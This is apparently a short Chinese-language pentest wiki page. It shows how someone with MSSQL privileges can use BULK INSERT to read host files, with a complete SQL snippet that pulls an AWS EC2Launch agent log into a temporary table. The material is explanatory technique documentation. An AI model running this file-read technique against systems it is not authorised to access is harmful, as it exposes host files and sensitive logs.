---
title: MSSQL 读取实例信息
---
<center><h1>MSSQL 读取实例信息</h1></center>

---

如果拿到了 MSSQL 数据库权限，则可以通过 BULK INSERT 读取数据库所在实例的文件，这里以在AWS 下读取日志文件为例。

```sql
create table #testtable(context ntext);
BULK INSERT #testtable FROM 'C:\ProgramData\Amazon\EC2Launch\log\agent.log'
WITH (DATAFILETYPE = 'char',KEEPNULLS)
select * from #testtable
drop table #testtable;
```

</br><img width="800" src="/img/1651979050.png"></br>

<Vssue />

<script>
export default {
    mounted () {
      this.$page.lastUpdated = "2022年5月8日"
    }
  }
</script>